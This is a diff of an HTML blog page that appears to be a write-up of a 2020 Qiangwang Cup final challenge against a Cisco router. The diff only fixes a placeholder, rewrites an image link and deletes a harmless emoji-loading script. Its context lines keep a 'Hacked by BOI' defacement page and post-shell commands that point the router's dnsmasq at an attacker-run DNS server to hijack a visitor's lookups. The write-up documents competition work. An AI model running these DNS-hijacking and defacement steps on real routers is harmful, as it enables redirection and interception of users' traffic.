@@ -127,33 +127,15 @@
 <pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">100</span>px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hacked by BOI<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
 </li>
 <li><p>getshell后，执行下列命令：</p>
-<pre class=" language-sh"><code class="language-sh">echo "nameserver 搭建的DNS服务器公网" > /tmp/resolv.conf;
+<pre class=" language-sh"><code class="language-sh">echo "nameserver 搭建的DNS服务器公网IP" > /tmp/resolv.conf;
 killall dnsmasq;
 /usr/sbin/dnsmasq -C /tmp/dnsmasq.conf -r /tmp/resolv.conf</code></pre>
 </li>
 </ol>
 <p>之后让工作人员的验证机通过lan口连接路由器， 设置验证机的DNS服务器IP地址为路由器IP，清除浏览器历史记录，清除本机的DNS缓存，使用Firefox浏览器访问<a href="http://www.baidu.com。" target="_blank" rel="noopener">www.baidu.com。</a></p>
-<p><img src="2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BCisco%E8%B7%AF%E7%94%B1%E5%99%A8/image-20200930133511445.png" alt=""></p>
+<p><img src="https://pup2y.github.io/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/image-20200930133511445.png" alt=""></p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>感谢关老哥不厌其烦的回答我所有问题，感谢张禹师兄！感谢阳哥！感谢恩泽巨佬！</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                 <source type="audio/mpeg" src="">
